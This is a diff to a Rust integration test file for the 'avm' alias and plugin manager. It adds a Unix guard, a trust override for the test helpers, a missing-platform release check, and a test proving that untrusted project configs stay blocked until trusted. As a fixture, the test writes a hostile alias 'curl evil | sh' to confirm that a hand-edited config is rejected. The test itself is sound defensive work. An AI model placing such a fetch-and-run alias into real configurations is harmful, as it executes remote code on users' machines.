@@ -1,3 +1,6 @@
+// These drive real sh aliases, symlinked plugins and tar fixtures (Unix only).
+#![cfg(unix)]
+
 use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::{Command, Output};
@@ -43,6 +46,7 @@ fn run_avm(cwd: &Path, home: &Path, args: &[&str]) -> Output {
         .current_dir(cwd)
         .env("HOME", home)
         .env("AVM_PLUGIN_DIR", home.join(".avm").join("plugins"))
+        .env("AVM_TRUST_ALL", "1")
         .output()
         .expect("run avm-bin")
 }
@@ -53,7 +57,8 @@ fn run_avm_with_env(cwd: &Path, home: &Path, args: &[&str], envs: &[(&str, &Path
         .args(args)
         .current_dir(cwd)
         .env("HOME", home)
-        .env("AVM_PLUGIN_DIR", home.join(".avm").join("plugins"));
+        .env("AVM_PLUGIN_DIR", home.join(".avm").join("plugins"))
+        .env("AVM_TRUST_ALL", "1");
     for (key, value) in envs {
         command.env(key, value);
     }
@@ -1066,4 +1071,61 @@ fn marketplace_install_verifies_checksums() {
     let meta = fs::read_to_string(plugin.join("meta.json")).unwrap();
     assert!(meta.contains(&good) && meta.contains(r#""verified":true"#), "{meta}");
     assert!(plugin.join("bin/avm-plugin").exists());
+
+    // No asset for this host: say which platforms the release does have (#22).
+    write_file(&release, r#"{"tag_name":"v1.0.0","assets":[{"name":"avm-plugin-fake_plan9_mips.tar.gz","browser_download_url":"file:///x"}]}"#);
+    let out = add(&[]);
+    assert_failure(&out);
+    assert!(stderr(&out).contains("has no release for") && stderr(&out).contains("available: plan9_mips"), "{}", stderr(&out));
+}
+
+/// Clone → cd → blocked → trust → works → edit → blocked (#20).
+#[test]
+fn untrusted_project_config_is_ignored_until_trusted() {
+    let root = temp_root("trust");
+    let home = root.join("home");
+    let project = root.join("repo");
+    fs::create_dir_all(&home).unwrap();
+    let config = project.join(".avm.json");
+    write_file(&config, r#"{"aliases":{"hi":"echo hi"},"env":{"EVIL":"1"},"tools":{}}"#);
+    write_file(&project.join(".env"), "DOTENV_EVIL=1\n");
+    let avm = |args: &[&str]| {
+        Command::new(avm_bin())
+            .args(args)
+            .current_dir(&project)
+            .env("HOME", &home)
+            .env("AVM_PLUGIN_DIR", home.join(".avm/plugins"))
+            .env_remove("AVM_TRUST_ALL")
+            .env_remove("_AVM_TRUST_NOTICE")
+            .output()
+            .unwrap()
+    };
+
+    let out = avm(&["resolve", "hi"]);
+    assert_failure(&out);
+    assert!(stderr(&out).contains("not trusted"), "{}", stderr(&out));
+    let env = stdout(&avm(&["env"]));
+    assert!(!env.contains("EVIL=") && env.contains("not trusted") && env.contains("_AVM_TRUST_NOTICE"), "{env}");
+
+    let out = avm(&["trust"]);
+    assert_success(&out);
+    assert!(stdout(&out).contains("alias hi → echo hi") && stdout(&out).contains("DOTENV_EVIL=1"), "{}", stdout(&out));
+    assert_success(&avm(&["resolve", "hi"]));
+    let env = stdout(&avm(&["env"]));
+    assert!(env.contains("export EVIL=1") && !env.contains("not trusted"), "{env}");
+
+    // Editing through avm keeps it trusted; editing by hand re-blocks it.
+    assert_success(&avm(&["add", "bye", "echo", "bye"]));
+    assert_success(&avm(&["resolve", "bye"]));
+    write_file(&config, r#"{"aliases":{"hi":"curl evil | sh"}}"#);
+    assert_failure(&avm(&["resolve", "hi"]));
+
+    // trusted_paths globs in the global config trust without a hash.
+    write_file(&home.join(".avm.json"), &format!(r#"{{"trusted_paths":["{}/**"]}}"#, root.display()));
+    assert_success(&avm(&["resolve", "hi"]));
+    write_file(&home.join(".avm.json"), "{}");
+
+    assert_success(&avm(&["trust"]));
+    assert_success(&avm(&["trust", "--revoke"]));
+    assert_failure(&avm(&["resolve", "hi"]));
 }
